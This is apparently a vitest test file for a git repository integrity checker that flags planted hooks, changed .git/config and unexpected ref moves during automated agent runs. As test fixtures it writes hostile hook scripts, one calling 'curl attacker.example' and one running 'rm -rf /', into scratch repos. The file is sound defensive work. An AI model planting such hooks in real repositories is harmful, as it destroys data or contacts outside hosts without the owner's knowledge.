import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { git, initScratchRepo } from "@/testUtils/gitRepo";

// integrity.ts resolves its baseline dir from DATA_DIR at import time.
const testDataDir = fs.mkdtempSync(path.join(os.tmpdir(), "radulf-integrity-"));
process.env.RADULF_DATA_DIR = path.join(testDataDir, "data");
const { db, refWrites } = await import("@/db");
const {
  snapshotRepoIntegrity,
  checkRepoIntegrity,
  saveBaseline,
  loadBaseline,
  removeBaseline,
  recordRefWrite,
} = await import("./integrity");

const RUN_BRANCH = "ralph/test-card-run1";
let repo: string;

beforeAll(() => {
  repo = initScratchRepo("radulf-integrity-repo-");
  git(repo, "branch", RUN_BRANCH);
});

afterAll(() => {
  fs.rmSync(repo, { recursive: true, force: true });
  fs.rmSync(testDataDir, { recursive: true, force: true });
  delete process.env.RADULF_AUTH_SECRET;
  delete process.env.RADULF_DATA_DIR;
});

describe("repo integrity check (spec 14 L3 1g)", () => {
  it("passes when nothing changed", async () => {
    const baseline = (await snapshotRepoIntegrity(repo))!;
    expect(baseline).not.toBeNull();
    expect(
      await checkRepoIntegrity(repo, baseline, { runBranch: RUN_BRANCH, checkRefs: true }),
    ).toEqual([]);
  });

  it("returns null for a path that is not a git repo", async () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "radulf-notrepo-"));
    try {
      expect(await snapshotRepoIntegrity(dir)).toBeNull();
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });

  it("catches a planted .git/hooks/pre-commit", async () => {
    const baseline = (await snapshotRepoIntegrity(repo))!;
    const hook = path.join(repo, ".git", "hooks", "pre-commit");
    fs.writeFileSync(hook, "#!/bin/sh\ncurl attacker.example\n");
    try {
      const violations = await checkRepoIntegrity(repo, baseline, {
        runBranch: RUN_BRANCH,
        checkRefs: true,
      });
      expect(violations).toEqual(["hook appeared: .git/hooks/pre-commit"]);
    } finally {
      fs.rmSync(hook, { force: true });
    }
  });

  it("catches a modified hook that existed at baseline", async () => {
    const hook = path.join(repo, ".git", "hooks", "post-merge");
    fs.writeFileSync(hook, "#!/bin/sh\necho legit\n");
    const baseline = (await snapshotRepoIntegrity(repo))!;
    fs.writeFileSync(hook, "#!/bin/sh\necho evil\n");
    try {
      expect(
        await checkRepoIntegrity(repo, baseline, { runBranch: RUN_BRANCH, checkRefs: true }),
      ).toEqual(["hook changed: .git/hooks/post-merge"]);
    } finally {
      fs.rmSync(hook, { force: true });
    }
  });

  it("catches a .git/config change (e.g. core.hooksPath redirection)", async () => {
    const baseline = (await snapshotRepoIntegrity(repo))!;
    git(repo, "config", "core.hooksPath", "/tmp/evil-hooks");
    try {
      expect(
        await checkRepoIntegrity(repo, baseline, { runBranch: RUN_BRANCH, checkRefs: true }),
      ).toEqual([".git/config changed"]);
    } finally {
      git(repo, "config", "--unset", "core.hooksPath");
    }
  });

  it("allows the run's own branch to move but catches any other ref", async () => {
    const baseline = (await snapshotRepoIntegrity(repo))!;
    // The run's own branch moving is legitimate loop work.
    git(repo, "update-ref", `refs/heads/${RUN_BRANCH}`, "HEAD");
    fs.writeFileSync(path.join(repo, "new.txt"), "x");
    git(repo, "add", ".");
    git(repo, "commit", "-m", "moves main");
    try {
      const violations = await checkRepoIntegrity(repo, baseline, {
        runBranch: RUN_BRANCH,
        checkRefs: true,
      });
      expect(violations).toHaveLength(1);
      expect(violations[0]).toMatch(/^ref moved: refs\/heads\/main /);
      // The pre-merge variant deliberately ignores ref movement.
      expect(
        await checkRepoIntegrity(repo, baseline, { runBranch: RUN_BRANCH, checkRefs: false }),
      ).toEqual([]);
    } finally {
      git(repo, "reset", "--hard", "HEAD~1");
    }
  });

  it("ignores sibling ralph/* refs, which Radulf moves itself (spec 19)", async () => {
    const sibling = "refs/heads/ralph/other-card-run2";
    const finished = "refs/heads/ralph/finished-card-run3";
    git(repo, "update-ref", sibling, "HEAD");
    git(repo, "update-ref", finished, "HEAD");
    const baseline = (await snapshotRepoIntegrity(repo))!;
    // Every worktree shares one .git, so this run's snapshot picks up what
    // the rest of the server did meanwhile: a second card's loop committing,
    // an improvement run cutting its feature branch, and a finished card's
    // worktree cleanup dropping its branch. commit-tree rather than commit,
    // so `main` stays put and only the ralph/ refs move.
    const tree = git(repo, "rev-parse", "HEAD^{tree}");
    const oid = git(repo, "commit-tree", tree, "-p", "HEAD", "-m", "sibling card's iteration");
    git(repo, "update-ref", sibling, oid);
    git(repo, "update-ref", "refs/heads/ralph/improve-1789947998164", oid);
    git(repo, "update-ref", "-d", finished);
    try {
      expect(
        await checkRepoIntegrity(repo, baseline, { runBranch: RUN_BRANCH, checkRefs: true }),
      ).toEqual([]);
    } finally {
      git(repo, "update-ref", "-d", sibling);
      git(repo, "update-ref", "-d", "refs/heads/ralph/improve-1789947998164");
    }
  });

  it("still catches a ref planted outside the ralph/ namespace", async () => {
    const baseline = (await snapshotRepoIntegrity(repo))!;
    git(repo, "update-ref", "refs/heads/attacker", "HEAD");
    try {
      expect(
        await checkRepoIntegrity(repo, baseline, { runBranch: RUN_BRANCH, checkRefs: true }),
      ).toEqual(["ref appeared: refs/heads/attacker"]);
    } finally {
      git(repo, "update-ref", "-d", "refs/heads/attacker");
    }
  });

  it("ignores the remote-tracking ref a PR push creates (spec 20)", async () => {
    const baseline = (await snapshotRepoIntegrity(repo))!;
    // `git push --set-upstream origin ralph/<branch>` writes this locally.
    git(repo, "update-ref", "refs/remotes/origin/ralph/pushed-card-run4", "HEAD");
    git(repo, "update-ref", "refs/remotes/origin/someone-elses-branch", "HEAD");
    try {
      expect(
        await checkRepoIntegrity(repo, baseline, { runBranch: RUN_BRANCH, checkRefs: true }),
      ).toEqual(["ref appeared: refs/remotes/origin/someone-elses-branch"]);
    } finally {
      git(repo, "update-ref", "-d", "refs/remotes/origin/ralph/pushed-card-run4");
      git(repo, "update-ref", "-d", "refs/remotes/origin/someone-elses-branch");
    }
  });

  it("takes Radulf's own base-branch move off a live run's baseline (spec 20)", async () => {
    const baseline = (await snapshotRepoIntegrity(repo))!;
    expect(baseline.capturedAt).toMatch(/^\d{4}-\d{2}-\d{2}T/);
    try {
      // Another card's approved merge moves the base branch under this run.
      fs.writeFileSync(path.join(repo, "merged.txt"), "x");
      git(repo, "add", ".");
      git(repo, "commit", "-m", "ralph: merge another card");
      const head = git(repo, "rev-parse", "HEAD");

      // Unrecorded it reads as tampering, which is the point of still
      // checking the base branch at all (spec 19).
      const before = await checkRepoIntegrity(repo, baseline, {
        runBranch: RUN_BRANCH,
        checkRefs: true,
      });
      expect(before).toHaveLength(1);
      expect(before[0]).toMatch(/^ref moved: refs\/heads\/main /);

      // A write recorded for a different repo must not excuse this one.
      recordRefWrite("/not/this/repo", "refs/heads/main", head, null);
      expect(
        await checkRepoIntegrity(repo, baseline, { runBranch: RUN_BRANCH, checkRefs: true }),
      ).toHaveLength(1);

      // A write that predates the baseline cannot explain a move seen after
      // it: the ref was already at the baseline oid when the run started.
      db.insert(refWrites)
        .values({
          repoPath: repo,
          ref: "refs/heads/main",
          sha: head,
          workerId: "w0",
          writtenAt: "2000-01-01T00:00:00.000Z",
        })
        .run();
      expect(
        await checkRepoIntegrity(repo, baseline, { runBranch: RUN_BRANCH, checkRefs: true }),
      ).toHaveLength(1);

      // Recorded against this repo since the baseline, the run stops
      // reporting our own merge, from any process, not just the one that
      // took the baseline.
      recordRefWrite(repo, "refs/heads/main", head, "w1");
      expect(
        await checkRepoIntegrity(repo, baseline, { runBranch: RUN_BRANCH, checkRefs: true }),
      ).toEqual([]);
    } finally {
      db.delete(refWrites).run();
      git(repo, "reset", "--hard", "HEAD~1");
    }
  });

  it("catches a hook planted AFTER a clean run-end check, at the pre-merge re-check", async () => {
    const baseline = (await snapshotRepoIntegrity(repo))!;
    // Run-end check passes…
    expect(
      await checkRepoIntegrity(repo, baseline, { runBranch: RUN_BRANCH, checkRefs: true }),
    ).toEqual([]);
    // …then a surviving process plants a hook while the card sits in review.
    const hook = path.join(repo, ".git", "hooks", "post-merge");
    fs.writeFileSync(hook, "#!/bin/sh\nrm -rf /\n");
    try {
      expect(
        await checkRepoIntegrity(repo, baseline, { runBranch: RUN_BRANCH, checkRefs: false }),
      ).toEqual(["hook appeared: .git/hooks/post-merge"]);
    } finally {
      fs.rmSync(hook, { force: true });
    }
  });

  it("persists baselines per run for the pre-merge re-check", async () => {
    const baseline = (await snapshotRepoIntegrity(repo))!;
    saveBaseline("run-abc", baseline);
    expect(loadBaseline("run-abc")).toEqual(baseline);
    removeBaseline("run-abc");
    expect(loadBaseline("run-abc")).toBeNull();
  });
});
